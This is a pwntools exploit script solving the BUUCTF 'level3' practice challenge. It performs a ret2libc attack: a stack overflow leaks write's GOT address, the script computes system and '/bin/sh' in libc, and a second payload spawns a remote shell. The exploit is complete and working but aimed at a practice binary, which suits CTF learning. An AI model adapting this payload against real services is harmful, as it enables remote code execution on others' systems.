#Made by fly_autumn
#x86
from pwn import *
p = process("./level3")
p = remote("node5.buuoj.cn",29159)
elf = ELF("./level3")
context(os="linux",arch="i386")
libc = ELF("./libc.so.6")

offset = 140
write_plt = 0x8048340
write_got = elf.got["write"]
vuln_plt = 0x804844b

payload = b"\x00" * offset + p32(write_plt) + p32(vuln_plt) + p32(1) + p32(write_got) + p32(4)
p.recvuntil(b"Input:\n")
p.sendline(payload)

write_addr = u32(p.recv(4))
log.success("write addr: "+hex(write_addr))
libc_addr = write_addr - libc.sym["write"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("sys addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search("/bin/sh"))
log.success("sh addr: "+hex(sh_addr))

payload = b"\x00" * offset + p32(sys_addr) + p32(vuln_plt) + p32(sh_addr)
p.recvuntil(b"Input:\n")
p.sendline(payload)

p.interactive()
